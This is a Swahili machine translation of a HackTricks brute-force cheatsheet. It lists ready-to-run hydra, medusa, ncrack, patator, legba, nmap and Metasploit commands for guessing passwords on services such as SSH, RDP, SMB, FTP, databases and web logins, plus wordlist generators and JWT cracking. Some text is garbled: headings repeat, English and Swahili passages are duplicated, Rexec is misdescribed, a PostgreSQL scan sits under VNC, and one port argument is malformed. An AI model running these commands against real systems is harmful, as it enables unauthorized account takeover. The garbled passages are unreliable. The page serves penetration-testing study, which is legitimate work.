# Brute Force - Mwongozo wa Udanganyifu

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za **jamii ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udanganyifu kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Vitambulisho vya Chaguo-msingi

**Tafuta kwenye google** vitambulisho vya chaguo-msingi vya teknolojia inayotumiwa, au **jaribu viungo hivi**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **Tengeneza Kamusi Yako Mwenyewe**

Pata habari nyingi kuhusu lengo kama unavyoweza na tengeneza kamusi ya kipekee. Zana zinazoweza kusaidia:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl ni chombo kinachotumiwa kwa ufanisi kwenye mashambulizi ya nguvu ya brute. Inachambua maandishi kwenye ukurasa wa wavuti na kuchuja maneno muhimu kujenga orodha ya maneno yanayoweza kutumiwa kama nywila wakati wa kufanya mashambulizi ya nguvu ya brute.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Jenereta nywila kulingana na maarifa yako kuhusu muathiriwa (majina, tarehe...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Chombo cha kuzalisha orodha ya maneno, kinachokuwezesha kutoa seti ya maneno, ukiruhusu kutengeneza mabadiliko mengi kutoka kwa maneno yaliyotolewa, kujenga orodha ya maneno ya kipekee na bora kutumia kuhusiana na lengo maalum.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Orodha za Maneno

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za jamii zilizo **za juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Huduma

Zimepangwa kwa herufi kwa jina la huduma.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a binary protocol that can be used to communicate with a web server. It is often used to connect web servers with servlet containers, such as Apache Tomcat. Attackers can attempt to brute force AJP authentication by trying different username and password combinations. This can be done using tools like Hydra or Burp Suite Intruder. It is important to use strong and complex passwords to prevent successful brute force attacks.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace) 

## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM na Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra ni mfumo wa usambazaji wa hifadhi ya data inayotumika kwa kuhifadhi data kwenye seva nyingi. Kwa kawaida, kuna vikwazo vya kujaribu kuingia kwenye mfumo wa Cassandra kwa kutumia mbinu ya nguvu ya kujaribu. Mbinu hii inahusisha kujaribu maneno au taratibu za siri hadi neno sahihi au nywila itakapopatikana. Kwa kufanya hivyo, mshambuliaji anaweza kupata ufikiaji usio halali kwenye mfumo wa Cassandra.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

### CouchDB
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

### Usajili wa Docker
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch ni injini ya utaftaji wa wazi inayotumika sana kwa kuhifadhi na kutafuta data. Inaweza kudhibitiwa kwa kutumia API zake za HTTP, ambazo zinaweza kusababisha mashambulizi ya nguvu. Kwa mfano, unaweza kutumia zana kama Hydra au Burp Suite kufanya mashambulizi ya nguvu kwenye Elasticsearch kwa kujaribu maneno muhimu au nywila. Kumbuka kwamba kufanya mashambulizi ya nguvu bila idhini ni kinyume cha sheria na inaweza kusababisha madhara makubwa.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

### FTP
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### Kukokotoa Kwa Nguvu ya Kawaida ya HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Uthibitishaji wa Msingi wa HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Tuma Fomu
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Kwa http**s** lazima ubadilishe kutoka "http-post-form" hadi "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla au (D)rupal au (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) is a widely used protocol for email retrieval. It supports both online and offline modes, allowing users to access their email from different devices. IMAP servers are often targeted by hackers for brute force attacks to gain unauthorized access to email accounts.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC (Internet Relay Chat) ni mfumo wa mazungumzo ya moja kwa moja ambao unaruhusu washiriki kuwasiliana kwa kutumia vichanja vya maandishi.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

### JWT
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) ni itifaki inayotumiwa kwa kawaida kwa kudhibiti na kupata data katika mfumo wa saraka. LDAP inaweza kutumika katika mchakato wa kuvunja mfumo kwa kujaribu majina ya mtumiaji na nywila kwa njia ya nguvu ya brute-force.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

### MQTT
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

#### Brute Force

Brute force attacks involve trying all possible combinations of a password until the correct one is found. This method can be effective but is also time-consuming. Tools like Hydra and Medusa can be used to automate the process.

#### Swahili Translation

#### Kuvunja nguvu

Mbinu za kuvunja nguvu zinahusisha kujaribu mchanganyiko wote wa nenosiri hadi lile sahihi litakapopatikana. Mbinu hii inaweza kuwa na ufanisi lakini pia inachukua muda mrefu. Zana kama Hydra na Medusa zinaweza kutumika kusaidia kiotomatiki mchakato huu.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

### MSSQL

MSSQL is a popular database management system that is often targeted by attackers. Brute-forcing MSSQL involves attempting to login to the database by systematically trying all possible passwords until the correct one is found. This can be achieved using tools like Hydra or Ncrack. It is important to note that brute-forcing is a noisy attack and can easily be detected by intrusion detection systems.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL ni mfumo wa usimamizi wa database wa bure uliotumika sana. Kwa kawaida, mbinu ya kwanza ya kujaribu kuvunja usalama wa MySQL ni kwa kutumia mbinu ya Brute Force. Hii inahusisha kujaribu maneno ya siri tofauti moja baada ya nyingine hadi neno sahihi la siri linapatikana. Kuna zana nyingi zinazopatikana mtandaoni ambazo zinaweza kutumika kwa Brute Force dhidi ya MySQL.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

### OracleSQL

OracleSQL ni mfumo wa usimamizi wa database unaotumiwa sana. Kwa kawaida, kuna njia nyingi za kufanya mashambulizi ya Brute Force kwenye OracleSQL. Kwa mfano, unaweza kutumia programu ya kufanya majaribio ya maneno kwa kutumia orodha ya maneno maarufu au kutumia programu ya kufanya majaribio ya maneno kwa kutumia maneno ya kawaida yanayopatikana kwenye database. Kwa kufanya hivyo, unaweza kujaribu kuingia kwenye OracleSQL kwa kutumia majina ya mtumiaji na nywila maarufu.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Ili kutumia **oracle\_login** na **patator** unahitaji **kufunga**:
```bash
pip3 install cx_Oracle --upgrade
```
[Brute force ya hash ya OracleSQL nje ya mtandao](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**toleo 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** na **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

#### Brute Force

Brute force attacks involve trying all possible combinations of a password until the correct one is found. This method is time-consuming but can be effective, especially if the password is weak. Tools like Hydra and Medusa can automate the process of brute forcing passwords.

#### Protection

To protect against brute force attacks, use strong and complex passwords, implement account lockout policies, and use multi-factor authentication. Additionally, monitoring login attempts for suspicious activity can help detect and prevent brute force attacks.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

#### Brute Force Attack

Brute force attacks involve trying all possible combinations of usernames and passwords until the correct one is found. This method is often used when other techniques such as password guessing or social engineering fail. Brute force attacks can be time-consuming but are effective if the attacker is patient.

#### How to Defend Against Brute Force Attacks

1. **Strong Passwords**: Encourage users to use complex passwords that are difficult to guess.
2. **Account Lockout Policy**: Implement an account lockout policy that locks an account after a certain number of failed login attempts.
3. **Multi-Factor Authentication (MFA)**: Require users to authenticate using multiple methods such as passwords, security tokens, or biometrics.
4. **Rate Limiting**: Implement rate limiting to restrict the number of login attempts from a single IP address within a certain time frame.
5. **Monitoring and Logging**: Monitor login attempts and set up alerts for multiple failed attempts to detect and respond to brute force attacks in real-time.

By implementing these security measures, you can significantly reduce the risk of a successful brute force attack on your PostgreSQL database.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Unaweza kupakua pakiti ya `.deb` kufunga kutoka [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

Remote Desktop Protocol (RDP) ni itifaki inayotumiwa kwa kawaida kwa mbali kudhibiti kompyuta au seva.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis ni mfumo wa kuhifadhi data wa haraka sana unaotumika sana kwa kuhifadhi cache na data za kikao. Kwa sababu ya muundo wake rahisi, mara nyingi hupatikana bila kinga ya kutosha. Brute forcing inaweza kutumika kwa kujaribu kuingia kwa kutumia maneno ya siri yaliyopendekezwa au kwa kutumia orodha ya maneno ya siri maarufu.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec ni mbinu ya kujaribu kuingia kwenye mfumo kwa kujaribu maneno au tarakimu nyingi hadi upate nywila sahihi. Mbinu hii inaweza kutumika kwa mafanikio kuingia kwenye mifumo ambayo ina udhaifu katika usimamizi wa nywila.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin ni itifaki ya mbali inayotumika kuingia kwenye mfumo wa kompyuta kwa kutumia jina la mtumiaji na nenosiri. Kwa kawaida, mchakato wa kuingia unahitaji kujua jina la mtumiaji na nenosiri sahihi. Mbinu ya kuvunja mfumo kwa kujaribu maneno ya siri tofauti inayojulikana kama Brute Force inaweza kutumika kuvunja ulinzi wa mfumo wa Rlogin.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh ni itifaki ya mbali ambayo inaruhusu mtumiaji kuingia kwenye mfumo wa mbali na kutekeleza amri kwa kutumia mtandao. Kwa sababu Rsh hutumia uwazi wa jina la mtumiaji na nywila, inaweza kutumika kwa mashambulizi ya nguvu ya brute kwa urahisi. Kwa kawaida, mashambulizi ya nguvu ya brute dhidi ya Rsh hufanywa kwa kutumia programu kama vile Hydra au Medusa. Mashambulizi haya yanaweza kufanikiwa ikiwa mfumo wa lengo unaruhusu kuingia kwa mbali kwa kutumia Rsh na haujarekebishwa ipasavyo kuzuia mashambulizi ya nguvu ya brute.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

### Rsync

### Rsync

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

### RTSP
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP (Secure File Transfer Protocol) is a secure way to transfer files between machines over a secure channel. It is commonly used in the industry to securely transfer files between a client and a server.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

### SNMP
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

### SMB

SMB (Server Message Block) is a protocol for sharing resources, such as files and printers, over a network. It is widely used in Windows networks and is supported by other operating systems as well. 

### SMB

SMB (Server Message Block) ni itifaki ya kugawana rasilimali, kama vile faili na printa, kwenye mtandao. Inatumika sana katika mitandao ya Windows na pia inaungwa mkono na mifumo mingine ya uendeshaji.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

### SMTP
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS ni itifaki inayotumiwa kwa kusudi la kuficha shughuli za mtandao. Inaweza kutumika kama njia ya kuficha anwani ya IP ya mtumiaji au kufikia maeneo ya mtandao ambayo yanaweza kuwa vikwazo. Kwa kawaida, SOCKS hutumiwa kama seva ya mpatanishi kati ya mtumiaji na mtandao, ikiruhusu trafiki ya mtumiaji kupitia seva hiyo. Hii inaweza kusaidia katika kufanya mashambulizi ya nguvu kwa kuficha anwani ya IP ya shambulizi.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

### SQL Server

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH ni njia ya kuingia kwa mbali kwenye mfumo wa kompyuta kwa njia salama. Kwa kawaida, mchakato wa kuingia kwenye mfumo wa kompyuta unahitaji uthibitisho wa kitambulisho. Mbinu ya kuvunja uthibitisho huu kwa kujaribu maneno ya siri tofauti moja baada ya nyingine huitwa Brute Force.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Funguo dhaifu za SSH / Debian PRNG inayoweza kutabirika

Baadhi ya mifumo ina kasoro inayojulikana katika mbegu ya nasibu inayotumika kuzalisha vifaa vya kryptographia. Hii inaweza kusababisha nafasi ndogo sana ya funguo ambayo inaweza kuvunjwa kwa kutumia zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sets zilizotangulia kuzalishwa za funguo dhaifu pia zinapatikana kama [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ na OpenMQ)

Itifaki ya maandishi ya STOMP ni itifaki ya ujumbe inayotumiwa sana **kuruhusu mawasiliano laini na mwingiliano na huduma maarufu za foleni za ujumbe** kama RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia iliyostandardi na yenye ufanisi ya kubadilishana ujumbe na kutekeleza shughuli mbalimbali za ujumbe.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet ni itifaki ya mtandao inayotumika kwa mawasiliano ya maneno kati ya vifaa vya mtandao. Inaweza kutumika kama njia ya kuingia kwa mbali kwenye vifaa vya mtandao. Kwa kawaida, Telnet hutumia bandari ya 23 kwa mawasiliano yake. Katika muktadha wa udukuzi, mbinu ya kujaribu-nguvu (brute force) inaweza kutumika kujaribu maneno ya siri au nywila kwa kutumia Telnet.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC, au Virtual Network Computing, ni njia ya kipekee ya kudhibiti kompyuta kutoka mbali. Kwa kawaida, VNC hufanya kazi kwa kusanidi programu ya seva kwenye kompyuta ya lengo na programu ya mteja kwenye kompyuta ya kudhibiti. Kwa kutumia Brute Force, unaweza kujaribu kuingia kwa nguvu kwa kutumia maneno au tarakimu tofauti hadi upate ufikiaji usio halali kwenye mfumo wa VNC.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

